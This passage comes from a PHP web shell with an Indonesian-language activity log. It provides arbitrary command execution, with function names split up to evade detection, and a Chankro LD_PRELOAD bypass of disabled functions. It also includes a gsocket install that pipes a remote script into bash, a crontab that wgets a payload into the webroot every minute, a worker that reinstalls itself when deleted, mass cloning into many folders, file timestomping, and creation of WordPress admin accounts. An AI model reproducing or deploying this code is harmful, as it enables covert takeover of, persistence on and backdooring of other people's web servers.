AAAAMAAAAAAAAA+A0gAAAAAAD4DQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
        $cmdd = $_POST['cmd_input'];
        $meterpreter = $en($cmdd." > test.txt");
        $viewC0MM4NDResult = '<hr><p>Result: <font color="white">base64: ' . $meterpreter .'</br>Please refresh and check test.txt for the command output<br>test.txt created = vulnerable<br>test.txt not created = not vulnerable<br>Example: domain.com/yourpath/path/test.txt<br>Powered by Maw3six</font><br><br></textarea>';
        watchdog_log('COMMAND', ['Perintah: <code>' . $cmdd . '</code>', 'Mode: <b>BYPASS (Chankro)</b>', 'Path: <code>' . $full . '</code>'], 'Command dijalankan');
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        if(function_exists('mail')) {
            $m('a','a','a','a');
        } elseif(function_exists('mb_send_mail')) {
            $mb('a','a','a','a');
        } elseif(function_exists('error_log')) {
            $err('a',1,'a');
        } elseif(function_exists('imap_mail')) {
            $imp('a','a','a');
        }

    }elseif (isset($_POST['delete_file'])) {
        $fileToD3L3T3 = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToD3L3T3)) {
            if (is_dir($fileToD3L3T3)) {
                if (deleteDirectory($fileToD3L3T3)) {
                    watchdog_log('DELETE', ['Folder: <code>' . $fileToD3L3T3 . '</code>'], 'Folder dihapus');
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if ($unl($fileToD3L3T3)) {
                    watchdog_log('DELETE', ['File: <code>' . $fileToD3L3T3 . '</code>'], 'File dihapus');
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldN4M3 = $currentDirectory . '/' . $_POST['old_name'];
        $newN4M3 = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldN4M3)) {
            if (rename($oldN4M3, $newN4M3)) {
                watchdog_log('RENAME', ['Dari: <code>' . $oldN4M3 . '</code>', 'Ke: <code>' . $newN4M3 . '</code>'], 'Item direname');
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    }elseif (isset($_POST['cmd_biasa'])) {
        $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
        $pc = "f"."c"."l"."o"."s"."e";
        $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
        $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
        $popx = "p"."o"."p"."e"."n";
        $pclose = "p"."c"."l"."o"."s"."e";

        $command = $_POST['cmd_biasa'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = $pp($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = $stg($pipes[1]);
            $errors = $stg($pipes[2]);
            $pc($pipes[1]);
            $pc($pipes[2]);
            $ppc($process);
            watchdog_log('COMMAND', ['Perintah: <code>' . $command . '</code>', 'Output: <pre>' . $htm(substr(trim($output . $errors), 0, 300)) . '</pre>'], 'Command dijalankan');
            if (!empty($errors)) {
                $viewC0MM4NDResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
            } else {
                $viewC0MM4NDResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
            }
        } else {
            $handle = $popx($command . " 2>&1", 'r');
            if ($handle) {
                $output = '';
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                $pclose($handle);
                $viewC0MM4NDResult = '<hr><p>Result: </p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            } else {
                $viewC0MM4NDResult = '<hr><p>Error: Failed to execute!</p>';
            }
        }
    }
     elseif (isset($_POST['install_gsocket'])) {
        $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
        $pc = "f"."c"."l"."o"."s"."e";
        $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
        $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
        $popx = "p"."o"."p"."e"."n";
        $pclose = "p"."c"."l"."o"."s"."e";

        $method = isset($_POST['gs_method']) && $_POST['gs_method'] === 'wget' ? 'wget' : 'curl';
        if ($method === 'wget') {
            $command = 'timeout 60 bash -c "$(wget -qO- https://gsocket.io/x)"';
        } else {
            $command = 'timeout 60 bash -c "$(curl -fsSL https://gsocket.io/x)"';
        }

        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = $pp($command, $descriptorspec, $pipes);
        $gsOutput = '';
        if (is_resource($process)) {
            $gsOutput = $stg($pipes[1]);
            $gsErr = $stg($pipes[2]);
            $pc($pipes[1]);
            $pc($pipes[2]);
            $ppc($process);
            if (!empty($gsErr)) { $gsOutput .= "\n" . $gsErr; }
        } else {
            $handle = $popx($command . " 2>&1", 'r');
            if ($handle) {
                while (!feof($handle)) { $gsOutput .= fread($handle, 4096); }
                $pclose($handle);
            } else {
                $gsOutput = 'Error: Failed to execute!';
            }
        }
        watchdog_log('INSTALL', ['Metode: <b>' . strtoupper($method) . '</b>', 'Output: <pre>' . $htm(substr(trim($gsOutput), 0, 300)) . '</pre>'], 'Gsocket diinstall');
        $viewC0MM4NDResult = '<hr><p>Gsocket Install [' . $method . '] Result:</p><textarea class="result-box">' . $htm($gsOutput) . '</textarea>';
    }
     elseif (isset($_POST['crontab_check'])) {
        $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
        $pc = "f"."c"."l"."o"."s"."e";
        $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
        $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
        $popx = "p"."o"."p"."e"."n";
        $pclose = "p"."c"."l"."o"."s"."e";
        $command = 'timeout 30 crontab -l';
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = $pp($command, $descriptorspec, $pipes);
        $ctOut = '';
        if (is_resource($process)) {
            $ctOut = $stg($pipes[1]);
            $ctErr = $stg($pipes[2]);
            $pc($pipes[1]);
            $pc($pipes[2]);
            $ppc($process);
            if (!empty($ctErr) && trim($ctOut) === '') { $ctOut = $ctErr; }
        } else {
            $handle = $popx($command . " 2>&1", 'r');
            if ($handle) { while (!feof($handle)) { $ctOut .= fread($handle, 4096); } $pclose($handle); }
            else { $ctOut = 'Error: Failed to execute!'; }
        }
        watchdog_log('CRON', [], 'Crontab list dicek');
        $viewC0MM4NDResult = '<hr><p>Crontab List Result:</p><textarea class="result-box">' . $htm($ctOut) . '</textarea>';
    }
     elseif (isset($_POST['crontab_install'])) {
        $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
        $pc = "f"."c"."l"."o"."s"."e";
        $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
        $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
        $popx = "p"."o"."p"."e"."n";
        $pclose = "p"."c"."l"."o"."s"."e";
        $raw = trim(isset($_POST['cron_raw']) ? $_POST['cron_raw'] : '');
        $path = trim(isset($_POST['cron_path']) ? $_POST['cron_path'] : '');
        if ($raw === '' || $path === '') {
            $viewC0MM4NDResult = '<hr><p>Error: Raw URL & path are required!</p>';
        } else {
            $command = 'echo "* * * * * wget -q ' . $raw . ' -O ' . $path . '" | crontab -';
            $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $process = $pp($command, $descriptorspec, $pipes);
            $ctOut = '';
            if (is_resource($process)) {
                $ctOut = $stg($pipes[1]);
                $ctErr = $stg($pipes[2]);
                $pc($pipes[1]);
                $pc($pipes[2]);
                $ppc($process);
                if (!empty($ctErr)) { $ctOut .= "\n" . $ctErr; }
            } else {
                $handle = $popx($command . " 2>&1", 'r');
                if ($handle) { while (!feof($handle)) { $ctOut .= fread($handle, 4096); } $pclose($handle); }
                else { $ctOut = 'Error: Failed to execute!'; }
            }
            watchdog_log('CRON', ['RAW URL: <code>' . $raw . '</code>', 'Save path: <code>' . $path . '</code>'], 'Crontab diinstall');
            if (trim($ctOut) === '') { $ctOut = 'Crontab installed: * * * * * wget -q ' . $raw . ' -O ' . $path; }
            $viewC0MM4NDResult = '<hr><p>Crontab Install Result:</p><textarea class="result-box">' . $htm($ctOut) . '</textarea>';
        }
    } elseif (isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
        $cf = $currentDirectory . '/' . $_POST['chmod_file'];
        $mode = trim($_POST['chmod_mode']);
        if (!file_exists($cf)) {
            echo '<hr>Error: Item not found!';
        } elseif (!preg_match('/^[0-7]{3,4}$/', $mode)) {
            echo '<hr>Error: Mode must be octal (e.g. 644, 755, 0777)!';
        } else {
            if (@chmod($cf, octdec($mode))) {
                echo '<hr>Permission <i style=color:red;>' . $htm($_POST['chmod_file']) . '</i> -> ' . $htm($mode) . ' OK<hr>';
            } else {
                echo '<hr>Error: Chmod failed!<hr>';
            }
        }
    } elseif (isset($_POST['touch_file'])) {
        $tf = $currentDirectory . '/' . $_POST['touch_file'];
        $tt = isset($_POST['touch_time']) ? trim($_POST['touch_time']) : '';
        if (!file_exists($tf)) {
            echo '<hr>Error: Item not found!';
        } else {
            $ok = false;
            if ($tt === '') {
                $ok = @touch($tf);
            } else {
                $ts = strtotime($tt);
                if ($ts === false) {
                    echo '<hr>Error: Invalid date format! (e.g. 2024-01-15 10:30:00)<hr>';
                    $ts = null;
                } else {
                    $ok = @touch($tf, $ts, $ts);
                }
            }
            if (isset($ok) && $ok) {
                echo '<hr>Touch <i style=color:red;>' . $htm($_POST['touch_file']) . '</i> OK' . ($tt !== '' ? ' -> ' . $htm($tt) : ' (now)') . '<hr>';
            } elseif (!isset($ts) || $ts !== null) {
                if (!isset($ok) || !$ok) echo '<hr>Error: Touch failed!<hr>';
            }
        }
    }
     elseif (isset($_POST['view_file'])) {
        $fileToV13W = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToV13W)) {
            $fileContent = $fgc($fileToV13W);
            $viewC0MM4NDResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
            <input type="submit" value=" Save "></form></td>';
        } else {
            $viewC0MM4NDResult = '<hr><p>Error: File not found!</p>';
        }
    }  elseif (isset($_POST['edit_file'])) {
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            watchdog_log('EDIT', ['File: <code>' . $ef . '</code>', 'Ukuran baru: <b>' . strlen($newContent) . ' bytes</b>'], 'File diedit');
            echo '<hr>File <i style=color:red;>' . $_POST['edit_file'].' edited OK<hr>';
        } else {
            echo '<hr>Error: Failed to edit file <i style=color:red;> ' . $_POST['edit_file'].' failed!<hr>';

        }
    }

}

echo '<nav class="crumb-bar" aria-label="Breadcrumb">';
echo '<span class="crumb-label"><svg viewBox="0 0 16 16"><path d="M1.5 2.5h4l1.2 1.5h7.8v8.5h-13z" fill="currentColor" opacity=".9"/></svg>DIR</span>';
echo '<a class="crumb-home" href="?d=' . x($scriptDirectory) . '" title="Home"><svg viewBox="0 0 16 16"><path d="M2 7.5L8 2l6 5.5M4 7v6.5h8V7" fill="none" stroke="currentColor" stroke-width="1.5"/></svg><span>HOME</span></a>';
echo '<ol class="crumb-trail">';

$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$segs = [];
foreach ($directories as $dir) {
    if ($dir === '' || $dir === null) continue;
    if ($currentPath === '') {
        // Segmen pertama: drive Windows (C:) tanpa separator depan,
        // path Unix (/var/...) dengan separator depan.
        if (preg_match('/^[A-Za-z]:$/', $dir)) {
            $currentPath = $dir;
        } else {
            $currentPath = DIRECTORY_SEPARATOR . $dir;
        }
    } else {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
    }
    $segs[] = ['name' => $dir, 'path' => $currentPath];
}
if (empty($segs)) {
    $segs[] = ['name' => $currentDirectory, 'path' => $currentDirectory];
}
$lastIdx = count($segs) - 1;
foreach ($segs as $i => $sg) {
    $nm = $htm($sg['name']);
    if ($i < $lastIdx) {
        echo '<li class="crumb-item"><a class="crumb-seg" href="?d=' . x($sg['path']) . '">' . $nm . '</a></li>';
    } else {
        echo '<li class="crumb-item"><span class="crumb-cur" title="' . $htm($currentDirectory) . '">' . $nm . '</span></li>';
    }
}
echo '</ol>';
echo '<span class="crumb-full" title="' . $htm($currentDirectory) . '">' . $htm($currentDirectory) . '</span>';
echo '</nav>';
echo '<hr><form method="post" enctype="multipart/form-data" style="display:flex;align-items:stretch;gap:10px;flex-wrap:wrap;">';
echo '<input type="file" name="filetos" id="filetos" placeholder="Choose file:" style="margin:0;height:40px;box-sizing:border-box;">';
echo '<input type="submit" value="Upload" name="submit" style="height:40px;box-sizing:border-box;margin:0;">';
echo '<button type="button" id="menuDefendBtn" class="df-btn" style="padding:0 22px;margin:0;height:40px;box-sizing:border-box;">Defense Menu</button>';
echo '<button type="button" id="menuBackupBtn" class="df-btn" style="padding:0 22px;margin:0;height:40px;box-sizing:border-box;">Backup Menu</button>';
echo '<button type="button" id="wpAdminBtn" class="df-btn" style="padding:0 22px;margin:0;height:40px;box-sizing:border-box;">Create WP Admin</button>';
echo '</form>';
echo '<div id="menuDefendModal" class="df-panel-wrap">';
echo '<div class="df-panel">';
echo '<button type="button" onclick="closeMenuDefend()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Defense Menu</h3>';
echo '<button type="button" onclick="openGsocket()" class="df-btn">Gsocket</button>';
echo '<br>';
echo '<button type="button" onclick="openCrontab()" class="df-btn">Crontab</button>';
echo '<br>';
echo '<button type="button" onclick="openScanning()" class="df-btn">Scanner</button>';
echo '<br>';
echo '<button type="button" onclick="openAutoLoop()" class="df-btn">Auto Looping</button>';
echo '</div>';
echo '</div>';

echo '<div id="gsocketModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel">';
echo '<button type="button" onclick="backToMenuDefend()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Gsocket — Select Method</h3>';
echo '<button type="button" onclick="runGsocket(&#39;curl&#39;)" class="df-btn">CURL</button>';
echo '<button type="button" onclick="runGsocket(&#39;wget&#39;)" class="df-btn">WGET</button>';
echo '<div id="gsocketLoading" class="df-loading" style="display:none;">';
echo '<div class="gs-spinner"></div>';
echo '<div class="df-load-text">Installing Gsocket...</div>';
echo '</div>';
echo '<div id="gsocketOut" class="df-out" style="display:none;"><p class="df-out-title" id="gsocketOutTitle"></p><textarea class="result-box df-box" readonly id="gsocketOutBox"></textarea></div>';
echo '</div>';
echo '</div>';

echo '<div id="crontabModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel">';
echo '<button type="button" onclick="backToMenuDefend()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Crontab</h3>';
echo '<button type="button" onclick="crontabCheck()" class="df-btn">Check Crontab</button>';
echo '<br>';
echo '<button type="button" onclick="openCrontabInstall()" class="df-btn">Install Crontab</button>';
echo '<div id="crontabLoading" class="df-loading" style="display:none;">';
echo '<div class="gs-spinner"></div>';
echo '<div class="df-load-text">Processing...</div>';
echo '</div>';
echo '<div id="crontabOut" class="df-out" style="display:none;"><p class="df-out-title" id="crontabOutTitle"></p><textarea class="result-box df-box" readonly id="crontabOutBox"></textarea></div>';
echo '</div>';
echo '</div>';

echo '<div id="crontabInstallModal" class="df-panel-wrap" style="z-index:10000;">';
echo '<div class="df-panel" style="min-width:420px;">';
echo '<button type="button" onclick="backToCrontab()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Install Crontab</h3>';
echo '<input type="text" id="cronRaw" placeholder="Raw URL (file .txt/.php)" class="df-input">';
echo '<input type="text" id="cronPath" placeholder="Save path (/var/www/html/file.php)" class="df-input" style="margin-bottom:14px;">';
echo '<button type="button" onclick="crontabInstall()" class="df-btn">Install</button>';
echo '<div id="crontabInstallLoading" class="df-loading" style="display:none;">';
echo '<div class="gs-spinner"></div>';
echo '<div class="df-load-text">Installing...</div>';
echo '</div>';
echo '<div id="crontabInstallOut" class="df-out" style="display:none;"><p class="df-out-title" id="crontabInstallOutTitle"></p><textarea class="result-box df-box" readonly id="crontabInstallOutBox"></textarea></div>';
echo '</div>';
echo '</div>';

echo '<div id="scanningModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel" style="min-width:1100px;width:min(1100px,96vw);height:78vh;max-height:78vh;display:flex;flex-direction:column;text-align:left;overflow:hidden;">';
echo '<button type="button" onclick="backToMenuDefend()" class="df-x">[X]</button>';
echo '<h3 class="df-title" style="text-align:center;flex:0 0 auto;margin-bottom:14px;">Scanner</h3>';
echo '<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;flex:0 0 auto;">';
echo '<input type="text" id="scanPath" class="df-input" style="flex:1;margin-bottom:0;" placeholder="Path (e.g. /var/www/html)">';
echo '<button type="button" id="scanBtn" onclick="startScan()" class="df-btn">Start Scan</button>';
echo '</div>';
echo '<div id="scanProgressWrap" style="display:none;height:5px;background:#1e2530;border-radius:4px;overflow:hidden;margin-bottom:12px;flex:0 0 auto;">';
echo '<div id="scanProgressFill" style="height:100%;width:0;background:linear-gradient(90deg,#b43bff,#3b8bff);transition:width 0.3s;"></div>';
echo '</div>';
echo '<div id="scanStatus" class="df-load-text" style="margin-bottom:12px;flex:0 0 auto;min-height:20px;">Ready to scan. Multi-layer detection active.</div>';
echo '<div id="scanLoading" class="df-loading" style="display:none;flex:0 0 auto;position:absolute;left:0;right:0;top:50%;transform:translateY(-50%);z-index:5;"><div class="gs-spinner"></div><div class="df-load-text">Scanning...</div></div>';
echo '<div id="scanStats" style="display:none;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:10px;margin-bottom:14px;"></div>';
echo '<div id="scanTools" style="display:none;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:10px;flex:0 0 auto;">';
echo '<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none;color:#c9a8ff;font-size:13px;"><input type="checkbox" id="scanSelectAll" onchange="scanToggleAll()" style="width:18px;height:18px;cursor:pointer;"> Select All</label>';
echo '<button type="button" onclick="scanDeleteSelected()" class="df-btn" style="background:#dc3545;color:#fff;animation:none;padding:8px 16px;font-size:12px;">Delete Selected</button>';
echo '</div>';
echo '<div id="scanResultsWrap" style="display:none;flex:1 1 auto;min-height:0;overflow:auto;border:1px solid rgba(180,59,255,0.3);border-radius:8px;margin-top:auto;">';
echo '<table class="scan-table"><thead><tr><th style="width:34px;"></th><th>File</th><th>Ext</th><th>Score</th><th>Confidence</th><th>Entropy</th><th>Size</th><th>Layers</th></tr></thead><tbody id="scanBody"></tbody></table>';
echo '</div>';
echo '</div>';
echo '</div>';

echo '<div id="menuBackupModal" class="df-panel-wrap" style="z-index:9998;">';
echo '<div class="df-panel">';
echo '<button type="button" onclick="closeMenuBackup()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Backup Menu</h3>';
echo '<button type="button" onclick="openBackup()" class="df-btn">Upload & Backup</button>';
echo '<br>';
echo '<button type="button" onclick="openClone()" class="df-btn">Massive Cloner</button>';
echo '</div>';
echo '</div>';

echo '<div id="backupModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel" style="min-width:520px;max-width:94vw;text-align:center;">';
echo '<button type="button" onclick="backToMenuBackup()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Upload &amp; Backup</h3>';
echo '<form method="post" enctype="multipart/form-data" id="backupForm" style="display:flex;flex-direction:column;gap:10px;align-items:stretch;">';
echo '<input type="file" name="backup_file" id="backupFile">';
echo '<input type="text" id="backupPath" class="df-input" placeholder="Path (e.g. /var/www/html)">';
echo '<input type="number" id="backupCount" class="df-input" min="1" value="1" placeholder="Folder count">';
echo '<button type="button" onclick="runBackup()" class="df-btn">Backup</button>';
echo '</form>';
echo '<div id="backupLoading" class="df-loading" style="display:none;">';
echo '<div class="gs-spinner"></div>';
echo '<div class="df-load-text">Uploading...</div>';
echo '</div>';
echo '<div id="backupOut" class="df-out" style="display:none;"><p class="df-out-title" id="backupOutTitle"></p><textarea class="result-box df-box" readonly id="backupOutBox" style="height:180px;"></textarea></div>';
echo '</div>';
echo '</div>';

/* watchdog modals removed */

echo '<div id="autoLoopModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel" style="min-width:560px;max-width:94vw;text-align:center;">';
echo '<button type="button" onclick="backToMenuDefend()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Auto Looping</h3>';
echo '<div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px;">';
echo '<span>Worker status:</span>';
echo '<span id="alStatusBadge" style="padding:5px 16px;border-radius:20px;font-weight:bold;font-size:13px;background:#333;color:#aaa;">...</span>';
echo '<button type="button" onclick="autoLoopStatus()" style="padding:4px 10px;border:none;border-radius:6px;cursor:pointer;font-size:11px;background:#3b8bff;color:#fff;">Check</button>';
echo '</div>';
echo '<div id="alSetupBox" style="display:none;">';
echo '<div style="background:rgba(255,165,0,0.1);border:1px solid rgba(255,165,0,0.4);border-radius:8px;padding:10px;margin-bottom:12px;text-align:left;font-size:12px;color:#ffcc80;">';
echo 'No .autoloop.conf yet. Fill in the raw file URL and folder path to set up the worker.';
echo '</div>';
echo '<input type="text" id="alSource" class="df-input" placeholder="Raw URL (e.g. https://raw.githubusercontent.com/.../file.php)">';
echo '<input type="text" id="alPath" class="df-input" placeholder="Folder path (e.g. /var/www/html)">';
echo '<input type="text" id="alTarget" class="df-input" placeholder="Monitored file name (e.g. bp2.php)">';
echo '<div style="display:flex;gap:10px;justify-content:center;margin-bottom:10px;">';
echo '<label style="cursor:pointer;color:#c9a8ff;font-size:13px;"><input type="radio" name="al_method" value="wget" checked> WGET</label>';
echo '<label style="cursor:pointer;color:#c9a8ff;font-size:13px;"><input type="radio" name="al_method" value="curl"> CURL</label>';
echo '</div>';
echo '<button type="button" onclick="autoLoopSetup()" class="df-btn">Setup &amp; Start</button>';
echo '</div>';
echo '<div id="alActiveBox" style="display:none;">';
echo '<div style="background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.35);border-radius:8px;padding:10px;margin-bottom:12px;font-size:12px;color:#a8ffd4;text-align:left;">';
echo 'Worker active. The target file is monitored — if deleted, it is reinstalled to a random folder and logged to the heartbeat log.';
echo '</div>';
echo '<button type="button" onclick="autoLoopStop()" class="df-btn" style="background:#dc3545;color:#fff;animation:none;margin:4px;">Stop Worker</button>';
echo '<button type="button" onclick="autoLoopDelete()" class="df-btn" style="background:#6c757d;color:#fff;animation:none;margin:4px;">Remove Config</button>';
echo '<div style="margin-top:10px;font-size:12px;color:#8b949e;">Remove the config first to set up again.</div>';
echo '</div>';
echo '<div id="autoLoopLoading" class="df-loading" style="display:none;"><div class="gs-spinner"></div><div class="df-load-text">Processing...</div></div>';
echo '<div id="autoLoopOut" class="df-out" style="display:none;"><p class="df-out-title" id="autoLoopOutTitle"></p><textarea class="result-box df-box" readonly id="autoLoopOutBox" style="height:150px;"></textarea></div>';
echo '</div>';
echo '</div>';

echo '<div id="cloneModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel" style="min-width:520px;max-width:94vw;text-align:center;">';
echo '<button type="button" onclick="backToMenuBackup()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Massive Cloner</h3>';
echo '<div style="background:rgba(59,139,255,0.1);border:1px solid rgba(59,139,255,0.4);border-radius:8px;padding:10px;margin-bottom:12px;text-align:left;font-size:12px;color:#a8c8ff;">';
echo 'Clone this console file into several folders. No upload needed — it copies the currently running file.';
echo '</div>';
echo '<input type="text" id="clonePath" class="df-input" placeholder="Path (e.g. /var/www/html)">';
echo '<input type="number" id="cloneCount" class="df-input" min="1" value="1" placeholder="Folder count">';
echo '<button type="button" onclick="runClone()" class="df-btn">Clone</button>';
echo '<div id="cloneLoading" class="df-loading" style="display:none;"><div class="gs-spinner"></div><div class="df-load-text">Cloning...</div></div>';
echo '<div id="cloneOut" class="df-out" style="display:none;"><p class="df-out-title" id="cloneOutTitle"></p><textarea class="result-box df-box" readonly id="cloneOutBox" style="height:180px;"></textarea></div>';
echo '</div>';
echo '</div>';

echo '<div id="wpAdminModal" class="df-panel-wrap" style="z-index:9999;">';
echo '<div class="df-panel" style="min-width:480px;max-width:94vw;text-align:center;">';
echo '<button type="button" onclick="closeWpAdmin()" class="df-x">[X]</button>';
echo '<h3 class="df-title">Create WP Admin</h3>';
echo '<div style="background:rgba(59,139,255,0.1);border:1px solid rgba(59,139,255,0.4);border-radius:8px;padding:10px;margin-bottom:12px;text-align:left;font-size:12px;color:#a8c8ff;">';
echo 'Automatically locates wp-config.php, connects to the database and creates an administrator user. Path is optional (empty = this console folder).';
echo '</div>';
echo '<input type="text" id="wpPath" class="df-input" placeholder="Path (optional, WP folder)">';
echo '<input type="text" id="wpUser" class="df-input" placeholder="Admin username">';
echo '<input type="text" id="wpPass" class="df-input" placeholder="Password">';
echo '<input type="text" id="wpEmail" class="df-input" placeholder="Email (optional)">';
echo '<button type="button" onclick="runWpAdmin()" class="df-btn">Create Admin</button>';
echo '<div id="wpLoading" class="df-loading" style="display:none;"><div class="gs-spinner"></div><div class="df-load-text">Processing...</div></div>';
echo '<div id="wpOut" class="df-out" style="display:none;"><p class="df-out-title" id="wpOutTitle"></p><textarea class="result-box df-box" readonly id="wpOutBox" style="height:200px;"></textarea></div>';
echo '</div>';
echo '</div>';
echo '<hr>';
echo '<table border="5"><tbody>
<tr>
<td>
<center>Command (Bypass)<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_input" placeholder="whoami"><input type="submit" value="Run Command"></form></center></td>

<td><center>Command<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_biasa" placeholder="whoami"><input type="submit" value="Run Command"></form><center></td>

<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="folder_name" placeholder="Folder name"><input type="submit" value="Create Folder"></form><center></td>
<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="file_name" placeholder="File name"><input type="submit" value="Create File"></form></td></tr>
</tbody></table>';
echo $viewC0MM4NDResult;
echo '<table border=1 class="file-table">';
echo '<thead><tr><th>Name</th><th>Size</th><th>Owner</th><th>Modified</th><th>Perm</th><th class="act-head">Action</th></tr></thead><tbody>';
foreach ($scd($currentDirectory) as $v) {
    if ($v === '.' || $v === '..') continue;
    $u = $ril($v);
    $s = $st($u);
    $isDir = $isdir($currentDirectory . '/' . $v);
    $itemLink = $isDir ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = $isw($u);
    $vEsc = $htm($v);
